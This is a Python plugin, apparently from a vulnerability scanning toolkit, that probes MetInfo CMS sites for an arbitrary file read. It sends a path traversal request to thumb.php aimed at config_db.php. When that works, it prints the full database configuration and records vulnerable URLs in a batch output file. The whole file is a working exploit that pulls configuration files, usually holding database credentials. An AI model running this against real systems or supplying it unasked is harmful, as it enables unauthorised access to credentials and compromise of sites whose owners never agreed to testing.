#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from libs.reqset import ReqSet
from rich.prompt import Prompt
from libs.output import OutPutFile
urllib3.disable_warnings()
class Metinfo_File_Read_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/include/thumb.php?dir=http\..\..\config\config_db.php"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "<?php" in req.text and req.status_code==200:
                if not self.batch:
                    OutPrintInfoSuc("Metinfo", '目标存在Metinfo任意文件读取漏洞')
                    OutPrintInfo("Metinfo", url)
                    OutPrintInfoSuc("Metinfo", f'响应:\n{req.text.strip()}')
                else:
                    OutPrintInfoSuc("Metinfo", f'目标存在Metinfo任意文件读取漏洞: {url}')
                    OutPutFile("metinfo_file_read.txt",f'目标存在Metinfo任意文件读取漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Metinfo", f'目标 {input_url} 不存在Metinfo任意文件读取漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Metinfo",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("Metinfo", '开始检测Metinfo任意文件读取漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("Metinfo", 'Metinfo任意文件读取漏洞检测结束')

